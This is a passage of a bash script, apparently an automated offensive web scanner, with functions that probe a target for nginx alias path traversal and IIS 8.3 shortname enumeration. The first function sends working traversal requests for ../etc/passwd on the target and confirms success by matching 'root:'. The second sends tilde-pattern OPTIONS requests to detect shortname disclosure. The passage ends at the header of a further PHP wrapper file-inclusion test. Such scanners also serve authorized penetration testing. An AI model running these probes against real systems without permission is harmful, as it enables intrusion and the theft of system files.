rt_50_nginx_alias_traversal() {
    _section "[RT 50/60] NGINX ALIAS MISCONFIG TRAVERSAL"
    run "Testing nginx alias traversal (off-by-slash)..."
    > "$SESSION/rt/nginx_alias.txt"
    local ALIASES=("/images/" "/static/" "/files/" "/css/" "/js/" "/assets/" "/upload/" "/media/")
    for alias in "${ALIASES[@]}"; do
        # Missing trailing slash on alias = traversal
        local code=$(curl -s -o /dev/null -w "%{http_code}" "https://$TARGET${alias}../etc/passwd" --connect-timeout 8 2>/dev/null)
        [ "$code" = "200" ] && {
            local body=$(curl -s "https://$TARGET${alias}../etc/passwd" --connect-timeout 8 2>/dev/null)
            echo "$body" | grep -q "root:" && \
                { echo "NGINX ALIAS TRAVERSAL: ${alias}../etc/passwd" >> "$SESSION/rt/nginx_alias.txt"; rt "Nginx alias traversal — RCE path!"; }
        }
        # Doubled slash bypass
        local code2=$(curl -s -o /dev/null -w "%{http_code}" "https://$TARGET${alias}/../etc/passwd" --connect-timeout 8 2>/dev/null)
        [ "$code2" = "200" ] && echo "Possible: ${alias}/../ traversal" >> "$SESSION/rt/nginx_alias.txt"
    done
}

rt_51_iis_shortname_enum() {
    _section "[RT 51/60] IIS 8.3 SHORTNAME ENUMERATION"
    run "Testing IIS tilde shortname vulnerability..."
    > "$SESSION/rt/iis_shortname.txt"
    # Send OPTIONS request with tilde to trigger 404 vs 400 behavior
    local resp1=$(curl -s -I -X OPTIONS "https://$TARGET/*~1*/a.aspx" --connect-timeout 8 2>/dev/null)
    local code1=$(echo "$resp1" | grep -oP 'HTTP/\d\.\d \K\d+')
    local resp2=$(curl -s -I -X OPTIONS "https://$TARGET/*~1*\a.aspx" --connect-timeout 8 2>/dev/null)
    local code2=$(echo "$resp2" | grep -oP 'HTTP/\d\.\d \K\d+')
    # IIS responds differently for existing vs non-existing shortnames
    [ "$code1" != "$code2" ] 2>/dev/null && [ -n "$code1" ] && [ -n "$code2" ] && \
        { echo "IIS shortname enumeration: $code1 vs $code2" >> "$SESSION/rt/iis_shortname.txt"; rt "IIS 8.3 shortname enumeration possible!"; }
    # Server header check
    local srv=$(grep -i "^server:" "$SESSION/web/headers_raw.txt" 2>/dev/null | head -1)
    echo "$srv" | grep -qiE "IIS|Microsoft-IIS" && echo "IIS detected — shortname enum applicable" >> "$SESSION/rt/iis_shortname.txt"
}

rt_52_php_wrapper_lfi() {
